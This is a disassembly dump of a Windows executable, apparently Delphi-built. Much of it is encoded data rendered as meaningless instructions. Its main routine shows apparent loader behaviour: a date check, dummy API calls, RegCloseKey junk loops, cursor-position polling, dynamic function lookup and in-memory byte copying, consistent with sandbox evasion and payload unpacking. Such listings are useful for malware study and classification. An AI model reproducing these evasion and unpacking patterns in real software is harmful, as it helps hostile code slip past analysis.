sub_463627
fist [ esi + 0x5e ]
adc esp [ esi ]
and al 0x24
mov esp [ ecx * 4 - 0x26eca741 ]
push edx
aam 0x5f
jne r-xdata
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fistp [ esi + ebx * 4 ]
sub edi ebx
hlt
aam 0x59
mov dl 0xda
fcmovnu st3
test [ ebp - 0x242424e8 ] al
fcmovnu st3
xor [ ecx - 0x61ad4255 ] 0xb
xor [ ecx - 0x61ad4242 ] 0x9
xor [ ecx - 0x61ad424b ] 0xf
xor bl al
stc
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
sbb al 0x9e
mov edx [ esi + 0x5e ]
adc esp [ esi ]
and al 0x24
mov esp [ ecx * 4 - 0x2861af4d ]
loopne r-xdata
pop eax
adc ebx ecx
xchg [ 0x52bd0150 ] al
xchg [ ebx ] bh
xor [ ecx - 0x59ad4213 ] 0x33
test [ ecx - 0x71ad4211 ] dh
idiv [ ebp - 0x7bce59ae ]
mov cl 0xb7
cmp [ ebp - 0x420a71ae ] 0xb1eb8e52
mov [ 0x24280232 ] al
and al 0xdb
fcmovnu st3
fcmovnu st3
loopne r-xdata
fcmovnu st3
push esi
push esi
adc esp [ esi ]
and al 0x24
xor al [ ebp - 0x17 ]
fcmovnu st3
fcmovnu st3
fild [ eax + 0x52bdb8b1 ]
sub_463767
mov cl 0xdb
xor cl [ edx + eax * 8 ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnbe st4
insb
popfd
frstor [ esi + ebx * 4 ]
and ebx [ eax - 0x62 ]
daa
add [ edx + 0x2438e932 ] 0x24
fcmovnu st3
mov ebp 0x50038e52
or bh [ ebp - 0x7efe71ae ]
mov cl 0xea
mov ebp 0x81078e52
xor dl [ eax - 0x2424dbdc ]
fcmovnu st3
fistp [ eax + 0x1a ]
iretd
sub_463828
xor ah [ edi - 0xe ]
fcmovnu st3
fcmovnu st3
fild [ edx - 0x242424e8 ]
fcmovnu st3
push esi
xchg ebx eax
fnstenv [ eax + 0x12b0de1b ]
fisub [ ecx + 0x24 ]
into
fcmovnu st3
mov ebp 0x52eacf52
scasd [ edi ]
jmp r-xdata
cmpsd [ esi ] [ edi ]
fstp st3
sub_463934
dec [ ebx - 0x7423932c ]
mov ebp 0xbdd99c50
fcomp [ edi + 0x6cd4fbff ]
sbb ecx [ ebx + 0x8331d50 ]
sub eax 0x1f582424
xlat
push edx
lahf
dec ebx
pop esi
sbb esi [ edx ]
sub eax eax
fcmovnu st3
fcmovnu st3
push edx
pop ebp
sub ebx ebx
fcmovnu st3
push esi
sahf
cmp ecx [ ebx + 0x2428ab32 ]
and al 0xdb
fist [ ecx - 0x2d ]
fwait
pop edi
adc dh [ edx ]
nop
jmp r-xdata
sub_463a07
clc
fcmovnu st3
push esi
pop esi
sub esp [ eax ]
and al 0x24
xor ebx [ esi - 0x21 ]
fcmovnu st3
push eax
xchg esi eax
shl [ edx ] cl
mov dl 0xf2
fcmovnu st3
push eax
fist [ eax - 0x65 ]
retn
sub_463a7f
imul ecx [ edx + edx * 2 - 0x15cc2863 ] 0x39
and al 0x24
mov bl 0x92
push eax
or [ ebp - 0x74 ] al
xor bl bl
pop es
and al 0x24
fcmovnu st3
fcmovnu st3
fcmovnbe st4
pop ecx
outsb
neg bl
fild [ ebp - 0x797be3b0 ]
sbb bl bl
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fisttp [ edx - 0x2424149e ]
fstp [ edi - 0x64af25b0 ]
xlat
push eax
fwait
xlat
push eax
fist [ eax - 0x65 ]
retn
sub_463afe
sti
xor ah [ eax + 0x3f ]
and al 0x24
fcmovnu st3
aam 0x5e
fcomp st3
fcmovnu st3
mov [ ecx * 2 - 0x24242489 ] ah
push esi
pop esp
add [ ebp + 0x24 ] 0x24
inc edx
bound esp [ ebx + ebx * 8 ]
fcmovnu st3
sub al 0x22
mov [ ecx - 0x3c0050dc ] cs
xor esp edx
salc
fcmovnu st3
pop eax
pop ds
xlat
mov bl 0xdb
pop ebx
fcmovnu st3
mov [ edi + ebp * 4 ] ah
inc ebx
and al 0x8d
scasd [ edi ]
pushfd
xor ch [ eax ]
das
and al 0x24
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
test [ eax - 0x2424e7ee ] eax
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fstp [ ebp + 0x5ed40ae0 ]
xchg esp eax
iretd
sub_46464a
mov cl 0xb9
cmp [ ebp - 0x4edc61ae ] 0xffffffa8
xor [ edx ] 0xffffffdb
cmp al 0x24
and al 0xdb
fcmovnu st3
fcmovnu st3
fcmovnbe st4
pop ecx
out 0x6 eax
and al 0x24
xor bh [ eax ]
or eax 0x125e2424
aam 0x5f
sub esp [ esp ]
lea esi [ ebx ]
push ebx
int3
sub_464b96
mov cl 0xbe
cmp [ ebp - 0x4edc61ae ] 0xffffffa3
cmp [ ebp - 0x4ede61ae ] 0xffffffbe
xor [ edx ] 0xffffffe3
and al 0x24
and al 0x4b
inc edi
fcmovnu st3
fucomi st0
adc bl [ esi + 0x1b ]
aam 0x42
sbb dl [ eax + 0x1a ]
adc bl [ eax ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
mov cl 0xb3
test [ ebp - 0x4ec859ae ] bh
mov esp 0xa652bd84
xor eax 0xbd84bdb1
push edx
cmpsb [ esi ] [ edi ]
sub edx [ eax + 0x25 ]
mov ebp 0x5029a652
and bh [ ebp + 0x502fa652 ]
and eax 0x2da652bd
push eax
and edi [ ebp - 0x4edc59ae ]
lea edx [ eax + 0x25 ]
mov ebp 0xe821a652
and al 0x32

sub_464bfc
adc esp [ esp ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
aam 0x5f
cmp [ edx ] esp
and al 0x24
mov [ ecx - 0x1062a921 ] dh
mov esi [ edx ]
push ss
das
and al 0x24
fistp [ esi + 0x1b ]
aam 0x5f
or al 0x22
and al 0x24
mov cl 0xdf
mov bl 0xdb
jmp r-xdata
sub_464c7b
xor dl al
and eax 0xdbdb2424
and al 0xae
das
and al 0x8c
scasd [ edi ]
xor bl [ ebx - 0x26 ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fstp [ ebp + 0x5fd4095e ]
test ebp ebx
fcmovnu st3
lea esi [ edx ]
jo r-xdata
scasb [ edi ]
fcmovnu st3
fstp [ ebp - 0x7ebe71ae ]
xor dh [ eax ]
push ss
and al 0x24
fist [ esi - 0x31 ]
ficomp [ eax + 0x39 ]
aam 0x51
iretd
sub_464cff
and al 0x8d
lahf
push eax
sahf
daa
push eax
xchg esi eax
xlat
xor dh [ edx + 0x2b ]
and al 0x24
mov cl 0xdb
xor cl [ edx - 0x2424242b ]
xor ebx [ ebx + 0x2a ]
and al 0x24
push esi
sahf

sub_464d57
xor edx edx
and [ esp ] ah
xor bl [ ebp - 0x24dbdbdf ]
pop esi
and al 0xd4
pop esi
test eax 0x8b242436
xor bh [ ebp - 0x24dbdbca ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fucomi st0
add [ esi - 0x62 ] dl
daa
mov ecx [ eax + 0x379e5688 ]
mov ecx [ eax + 0x2420a032 ]
and al 0x24
scasb [ edi ]

sub_464f14
loopne r-xdata
xor cl [ ecx - 0x24dbdbf0 ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fucomi st0
sbb ebx [ ebx - 0x24e7ed7c ]
fcmovnu st3
fcmovnu st3
fisttp [ edx - 0x52db644f ]
mov esi [ edx ]
jae r-xdata
aam 0x5f
push ebp
fstpnce st3
fisttp [ eax - 0x4d39d54d ]
fwait
xor bh [ edx + 0xe ]
and al 0x24
fist [ esi + 0x5e ]
pop ds
daa
and al 0x24
and al 0x52
sahf
xor edx [ eax - 0x62 ]
das
push edx
sahf
aaa
call 0x2fe4a19c
xor cl [ ecx ]
adc al 0x24
and al 0xdb
fstp [ ebp - 0x42c271ae ]
push edx
xchg esi eax
sub esi [ ebx ]
or esp [ ebx ]
and al 0x24
xor ah [ edi - 0x24dbdbd1 ]
push edx
xchg [ ebx ] ah
sbb al 0xd8
add [ edx - 0x1f427d7e ] 0xa
aam 0x5f
popad
xor [ esp ] ah
push esi
sahf

and al 0x24
push edx
sahf
daa
xor eax [ ebx ]
and [ esp ] esp
mov esi [ edx ]
inc ebx
or [ esp ] esp
xor ebx ebx
and ah [ esp ]
pop eax
pop ds
xlat
mov cl 0xcb
push esi
sahf
pop es
mov [ edx ] dh
push cs
adc ah [ esp ]
push edx
sub_46503a
mov cl 0xae
mov ebp 0x501f9652
add al 0xbd
push edx
xchg [ ebx + 0x50 ] ch
add eax [ edx + 0x698652bd ]
mov ebp 0xb11d9652
mov dl 0x50
add eax 0x8652bd82
outsd
push eax
add esi [ edx ]
mov eax [ edx ]
and al 0x24
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnbe st4
pop edi
jge r-xdata
outsd
push esi
sahf
jg r-xdata
and al 0x24
push esi
xchg esi eax
dec esp
enter 0x65fa 0x32
int1
aad 0xdb
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
pop eax
sbb bl cl
cld
and al 0x24
pop esi
sbb edx esp
pop edi
dec eax
add al 0x24
and al 0xe8
sbb esi [ edx ]
dec esi
retn
sub_4652a5
and al 0x24
fcmovnbe st4
pop edi
and esi [ edx ]
and al 0x24
pop edx
jecxz r-xdata
push esi
pop esi
sahf
fcmovnu st3
aam 0x5e
aaa
xor ah [ esp ]
push eax
fwait
mov [ 0xffffffffdb27be58 ] eax
fcomp [ edx ]
push eax
mov [ 0xffffffffff8350c7 ] eax
push eax
stosd [ edi ]
sti
push eax
fwait
retn
sub_465362
xor ch [ ecx - 0x21 ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
loopne r-xdata
mov esp [ esp + ecx * 4 ]
mov ecx [ eax + 0x241de032 ]
and al 0xdb
fcmovnu st3
fcmovnu st3
fcmovnu st3
lea ecx [ eax + edx * 2 - 0x25209bd5 ]
fcmovnu st3
mov [ esi + 0x5e ] ss
outsd
and esp [ esp ]
mov ebp eax
add [ eax + 0x5e978d24 ] cl
sbb edx esp
pop edi
adc ebp [ edi ]
and al 0x24
push esi
pop esi
adc esp [ esi ]
and al 0x24
mov esi [ edx ]
and ebx [ ebx ]
and al 0x24
mov ebp 0x324da652
mov edi 0xdb242425
and esi [ edx ]
salc
salc
fcmovnu st3
fcmovnu st3
push eax
sbb al 0x33
lodsd [ esi ]
and al 0x24
xor [ edx ] 0x8e
xor al 0x24
and al 0xdb
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fist [ eax - 0x62 ]
shl [ ebx + ecx * 4 ] cl
[ esi + 0x1b ]
aam 0x5f
neg [ 0x328c2424 ]
xor al 0x34
and al 0x24
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
and al 0xae
aas
and al 0xb
mov cl 0xdf
mov bl 0xdb
jmp r-xdata
sub_4653c4
and al 0xad
mov ecx [ eax - 0x24a4b3dc ]
fcmovnu st3
and al 0xad
mov edx [ edx - 0x62 ]
das
mov [ ebx + 0x242f5133 ] cl
and al 0x58
pop ds
xlat
xor bl [ 0x50dbdbd7 ]
sbb eax 0x242b1633
and al 0x82
pop esi
sbb edx esp
pop esi
iretd
sub_4655b9
and al 0x8c
shl [ edi + ebp * 4 ] cl
call ebx
and al 0x8c
div [ ecx + 0x774c24db ]
fcmovnu st3
fild [ eax + ebx - 0x24242425 ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
xor [ ecx + 0x1f3f32b9 ] 0x24
and al 0xdb
push eax
lahf
dec ebx
ficomp [ edi - 0x60db3c01 ]
inc edi
push eax
lahf
inc edi
loopne r-xdata
and al 0x24
pop esi
sbb edx esp
pop esi
add edi [ ecx ]
and al 0x24
push esi
cmpsb [ esi ] [ edi ]
xor edx [ esi + 0x56 ]
imul esp [ esi ] 0x24
and al 0x32
adc [ eax ] ebx
and al 0x24
fcmovnu st3
fcmovnu st3
fisttp [ ebx + 0x24264932 ]
and al 0xdb
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fild [ ebx + 0x3f32b9b1 ]
pop ds
and al 0x24
fist [ eax - 0x61 ]
fcmovnu st3
fcmovnu st3
mov ebp 0x473228e0
aad 0xdb
fcmovnu st3
push esi
push esi
imul esp [ esi ] 0x24
and al 0x33
loop r-xdata
fcmovnu st3
test [ eax ] bl
fcmovnu st3
fcmovnu st3
retn
sub_465657
mov cl 0xdf
xor ah [ edx + 0x32 ]
and al 0x24
fcmovnu st3
fcom [ esi + 0x239b50d3 ]
xor bh [ esi + 0x30 ]
and al 0x24
sbb al 0x9e
aas
nop
lea edx [ esi + 0x339e1c90 ]
lea edx [ esi - 0x61e37270 ]
aaa
xchg esi eax
nop
lea edx [ esi - 0x69f061e4 ]
mov dl 0xb8
test eax 0xb4039e1c
test al 0xb4
mov ebp 0xaf079e1c
sti
xchg ebx eax
lodsd [ esi ]
sbb al 0x9e
pop ds
lea edx [ esi + 0x6e32baac ]
adc al 0x24
and al 0xdb
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fist [ eax - 0x6d ]
fbstp [ edx ]
hlt
sub_465c70
push eax
sahf
shl [ edx ] cl
stosd [ edi ]
xor [ esp ] esp
fcmovnu st3
fcmovnbe st4
pop edi
fstp st3
fcmovnu st3
mov esp [ ecx * 4 - 0x17604e2d ]
and al 0x56
lahf
call [ edi + 0xa338b8c ]
xor [ esp ] ah
pop eax
pop ds
xlat
mov cl 0xcb
push esi
lahf
jmp edi
sub_466a05
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_466a2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466a34
retn
sub_466a38
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403834#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d00
retn
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
mov [ rw-data ] 0x43cc
push 0xff
push rw-data
push 0x0
call GetModuleFileNameA
cmp [ rw-data ] 0x43
jne r-xdata
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
call GetLastError
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
cmp [ rw-data ] 0x46
jne r-xdata
mov [ rw-data ] 0x1a38
nop
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
nop
push 0x0
call RegCloseKey
jmp r-xdata
cmp [ rw-data ] 0x4c
jne r-xdata
mov [ rw-data ] 0x7091
nop
mov [ rw-data ] 0x1
nop
jmp r-xdata
cmp [ rw-data ] 0x53
je r-xdata
nop
nop
push 0x0
call RegCloseKey
nop
inc [ rw-data ]
cmp [ rw-data ] 0x2021
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov [ rw-data ] 0x40b7
push 0x0
call RegCloseKey
push 0x0
call RegCloseKey
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
push 0x0
call RegCloseKey
inc [ rw-data ]
cmp [ rw-data ] 0x9049
jne r-xdata
nop
push 0x0
call RegCloseKey
nop
nop
nop
mov eax 0x204965a2
call sub_4026cc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
nop
mov [ rw-data ] 0x1
mov ecx 0x47
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403038
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403030
mov [ eax ] dl
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x2049549e
jne r-xdata
call sub_403038
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
mov eax [ rw-data ]
call sub_4026ec
nop
nop
nop
mov [ rw-data ] 0x1
push 0x0
call RegCloseKey
inc [ rw-data ]
cmp [ rw-data ] 0x8c65
jne r-xdata
xor eax eax
mov [ rw-data ] eax
nop
nop
push rw-data
call GetCursorPos
nop
nop
nop
push 0xb
call sub_406034
nop
cmp [ rw-data ] 0x5
jbe r-xdata
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
push rw-data
call GetCursorPos
nop
mov edx rw-data
mov eax rw-data
call sub_4612c0
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x9
jbe r-xdata
nop
push 0x0
call sub_46133c
nop
jmp r-xdata
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403038
sub_466d50
pop ebx
add [ eax ] al
add [ eax + 0x6d ] bl
inc esi
add al ah
pop esp
inc eax
add [ eax - 0x2bffbfa4 ] dh
pop edx
inc eax
add [ eax + 0x5800405a ] al
pop ebp
inc eax
add [ eax ] ch
pop ebp
inc eax
add [ ecx + ebp * 2 + 0x69840040 ] dh
inc eax
add ah ch
imul eax [ eax ] sub_4069bc
xor [ esi ] cl
inc ecx
add [ eax ] al
push cs
inc ecx
add ah bh
insb
inc eax
add ah cl
insb
inc eax
add [ eax ] ah
rol [ eax ] cl
mov al [ 0xffffffff8c0040d0 ]
fiadd [ eax ]
pop esp
fiadd [ eax ]
xor al 0x4
inc ecx
add [ ebx + eax + 0x6100041 ] bh
inc ecx
add al ah
add eax 0xdf80041
inc ecx
add [ eax - 0x4bffbef3 ] ch
scasd [ edi ]
inc ecx
add [ edi + ebp * 4 ] al
inc ecx
add al ch
and eax 0x25b80042
inc edx
add [ ebx + ebp + 0x42 ] cl
add [ ebx + ebp ] bl
inc edx
add al bh
inc ebx
inc edx
add [ eax - 0x3fffbdbd ] bh
xor eax [ edx ]
nop
xor eax [ edx ]
inc eax
sub al 0x42
add [ eax ] dl
sub al 0x42
add al ah
mov dl 0x41
add [ eax - 0x53ffbe4e ] dh
and al 0x42
add al bl
and eax [ edx ]
shr [ esp + eax * 2 ] 0x0
nop
sub al 0x44
add [ eax ] al
xor al 0x42
add al dl
xor eax [ edx ]
jl r-xdata
inc esp
add [ edx + edx * 4 ] cl
inc esp
add [ eax ] bh
dec ecx
inc edx
add [ eax ] cl
dec ecx
inc edx
add al ah
push edx
inc edx
add [ edx + edx * 2 + 0x54440042 ] cl
inc edx
add [ esp + edx * 2 ] dl
inc edx
add [ esp + edx * 2 ] cl
inc edx
add ah bl
push ebx
inc edx
add ah dl
push ebx
inc edx
add [ ebx + edx * 2 + 0x539c0042 ] ah
inc edx
add [ ebx + edx * 2 + 0x42 ] ch
add [ esp + edx * 2 + 0x42 ] bh
add [ esp + edx * 2 + 0x42 ] cl
add [ eax ] bl
jbe r-xdata
push ebx
add al ch
jne r-xdata
ja r-xdata
add [ ebx + esi * 2 + 0x744c0042 ] bh
inc edx
add [ esp + esi * 2 ] bl
inc edx
add [ ebx + esi * 2 ] bl
inc edx
add ah ch
jb r-xdata
inc edx
add ah bh
push edx
inc edx
add [ esp + esi * 2 + 0x746c0042 ] dh
inc edx
add [ esi * 2 + 0x74d40042 ] bl
inc edx
add ah dh
jae r-xdata
push ebx
add ah bl
call 0xffffffffe8f26e98
inc edx
add [ eax ] dh
inc esp
inc edx
add [ eax ] al
inc esp
inc edx
add [ esp + eax * 2 + 0x42 ] dh
add [ eax ] bh
inc esp
inc edx
add [ esp + edx * 2 + 0x54840042 ] dh
inc edx
add ah ch
push esp
inc edx
add [ esp + edx * 2 + 0x5b240042 ] bh
inc edx
add al cl
pop edx
inc edx
add al dh
jno r-xdata
js r-xdata
add [ edx + eax * 4 - 0x7db7ffbe ] cl
inc edx
add [ edx + eax + 0x44 ] bh
add [ edx + eax ] dl
inc esp
add [ eax - 0x77ffbbeb ] bh
adc eax 0xf7100044
inc edx
add [ eax - 0x73ffbd0a ] bl
inc edi
inc edx
add [ edi + eax * 2 + 0x42 ] bl
add [ eax + ebx * 2 + 0x58280045 ] al
adc eax 0x15880044
inc esp
add [ eax ] dl
add [ edx + esi * 2 + 0x72580042 ] dl
inc edx
jb r-xdata
inc edx
add [ ebx + edx * 2 ] ch
add [ eax + 0x64004271 ] ch
push ebx
inc edx
add [ ebx + edx * 2 ] dh
add [ ebp + esi * 4 - 0x4aa3ffbb ] cl
inc ebp
add [ edx + ecx * 8 + 0x45 ] ah
add [ edx + ecx * 8 ] dh
inc ebp
add ah al
mov ch 0x45
add [ ebp + esi * 4 - 0x3ee3ffbb ] dl
inc ebp
add ah ch
rol [ ebp ] 0xd4
0x45
adc [ ebp + eax * 2 + 0x45b3c800 ] dh
add [ eax + edi * 2 ] bl
inc ebp
add [ eax ] dl
movsd [ edi ] [ esi ]
inc ebp
add al ah
movsb [ edi ] [ esi ]
inc ebp
add [ ecx + ecx * 4 + 0x45 ] ch
add [ ecx + ecx * 4 ] dh
inc ebp
add [ ecx + ecx * 4 - 0x7683ffbb ] ch
inc ebp
add ah al
xchg ebx eax
inc ebp
add [ ebx + edx * 4 - 0x5b4bffbb ] dl
inc ebp
add [ eax - 0x5c ] dh
inc ebp
add [ eax ] ch
stosb [ edi ]
inc ebp
add [ ecx + ebp * 4 + 0x45 ] ch
add [ esp + ebp * 4 ] bh
inc ebp
add [ esp + ebp * 4 ] cl
inc ebp
add [ eax ] ch
scasd [ edi ]
inc ebp
add al bh
scasb [ edi ]
inc ebp
add ah bl
push 0x45
add [ edx + ebp * 2 + 0x756c0045 ] ch
inc ebp
pop eax
inc ebp
add [ eax ] ch
add al ah
jne r-xdata
test [ edx ] sub_42f698
mov [ edi + 0x42 ] es
add [ edx + ebp * 8 + 0x42 ] al
add [ edx + ebp * 8 ] dl
inc edx
add [ eax + 0x38004275 ] cl
jne r-xdata
pop eax
add [ eax + 0x50004275 ] dl
jb r-xdata
add [ esi * 2 + 0x784c0045 ] bh
inc ebp
push 0x45
add [ ebp + esi * 2 + 0x45 ] ch
add [ eax ] ah
jb r-xdata
jne r-xdata
add [ eax + 0x20004277 ] bl
inc ebp
add [ eax ] dl
mov ah 0x45
add al cl
mov bl 0x45
sub [ edi - 0x5107ffbb ] ch
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_466d50
call sub_405c6c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454328
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_454340
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4543c0
call sub_403d40
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4055c4
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4055d8
sub_40121c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
sub_401224
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ __import_lookup_table_0(kernel32:ExitThread) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40123c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_40129c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012bc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ SysFreeString@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_401304
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40131c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401340
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ac2
jmp sub_403834
sub_401ac9
mov al [ rw-data ]
pop ebp
retn
sub_401ba6
jmp sub_403834
sub_401c74
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402288
retn
sub_402274
jmp sub_403834
sub_40241a
jmp sub_403834
sub_4026b9
jmp sub_403834
sub_40277c
call sub_405c20
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405c20
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027d0
mov [ rw-data ] edx
call sub_403e18
sub_402834
push eax
push edx
push ecx
call sub_405c20
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402828
retn
sub_402850
retn
sub_4028a4
retn
sub_4028a8
push ebx
call sub_405c20
mov ebx [ eax + 0x4 ]
call sub_405c20
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402908
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402918
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402990
mov edx [ eax + 0x1c ]
call sub_402948
retn
sub_402bf8
mov ecx 0xff
call sub_402c04
retn
sub_402c28
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402c44
jmp sub_402c44
sub_402c41
retn
sub_402fd1
jmp sub_403834
sub_403024
fninit
fwait
fldcw [ rw-data ]
retn
sub_403030
mov al 0x4
jmp sub_402828
sub_403084
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403090
push ebx
mov ebx eax
mov eax ebx
call sub_4030c0
call sub_4026cc
mov edx eax
mov eax ebx
call sub_403104
pop ebx
retn
sub_4030ac
push ebx
mov ebx eax
mov eax ebx
call sub_40315c
mov eax ebx
call sub_4026ec
pop ebx
retn
sub_4030c0
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_4030e8
call sub_40346c
test dl dl
jle r-xdata
retn
call sub_403454
sub_4031a8
retn
sub_403230
jmp sub_403834
sub_403237
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403328
mov eax 0x8000ffff
retn
sub_403330
retn
sub_403334
retn
sub_403338
retn
sub_40342d
jmp sub_403580
sub_403432
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403894
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403454
sub_403454
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_40345c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_40346c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_40347c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403544
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403560
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_40392d
retn
sub_403a70
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
